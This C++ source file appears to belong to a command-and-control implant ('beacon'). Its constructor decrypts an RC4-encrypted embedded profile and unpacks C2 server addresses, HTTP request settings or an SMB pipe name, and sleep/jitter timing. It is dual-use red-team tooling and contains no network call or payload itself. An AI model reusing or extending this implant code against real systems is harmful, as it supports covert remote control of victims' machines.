#include "AgentConfig.h"
#include "Packer.h"
#include "Crypt.h"
#include "utils.h"
#include "config.h"

AgentConfig::AgentConfig()
{
	ULONG length       = 0;
	ULONG size         = getProfileSize();
	CHAR* ProfileBytes = (CHAR*) MemAllocLocal(size);
	memcpy(ProfileBytes, getProfile(), size);

	Packer* packer = (Packer*)MemAllocLocal(sizeof(Packer));
	*packer = Packer( (BYTE*)ProfileBytes, size);
	ULONG profileSize = packer->Unpack32();

	this->encrypt_key = (PBYTE) MemAllocLocal(16);
	memcpy(this->encrypt_key, packer->data() + 4 + profileSize, 16);

	DecryptRC4(packer->data()+4, profileSize, this->encrypt_key, 16);
	
	this->agent_type = packer->Unpack32();
	
#if defined(BEACON_HTTP)
	this->profile.use_ssl       = packer->Unpack8();
	this->profile.port          = packer->Unpack32();
	this->profile.servers_count = packer->Unpack32();
	this->profile.servers       = (BYTE**) MemAllocLocal(this->profile.servers_count * sizeof(LPVOID) );
	for (int i = 0; i < this->profile.servers_count; i++)
		this->profile.servers[i] = packer->UnpackBytesCopy(&length);

	this->profile.http_method  = packer->UnpackBytesCopy(&length);
	this->profile.uri          = packer->UnpackBytesCopy(&length);
	this->profile.parameter    = packer->UnpackBytesCopy(&length);
	this->profile.user_agent   = packer->UnpackBytesCopy(&length);
	this->profile.http_headers = packer->UnpackBytesCopy(&length);
	this->profile.ans_pre_size = packer->Unpack32();
	this->profile.ans_size     = packer->Unpack32() + this->profile.ans_pre_size;

	this->listener_type = 0;

#elif defined(BEACON_SMB)

	this->profile.pipename = packer->UnpackBytesCopy(&length);
	this->listener_type = packer->Unpack32();

#endif

	this->sleep_delay  = packer->Unpack32();
	this->jitter_delay = packer->Unpack32();

	this->download_chunk_size = 0x19000;

	MemFreeLocal((LPVOID*)&packer, sizeof(Packer));
	MemFreeLocal((LPVOID*)&ProfileBytes, size);

}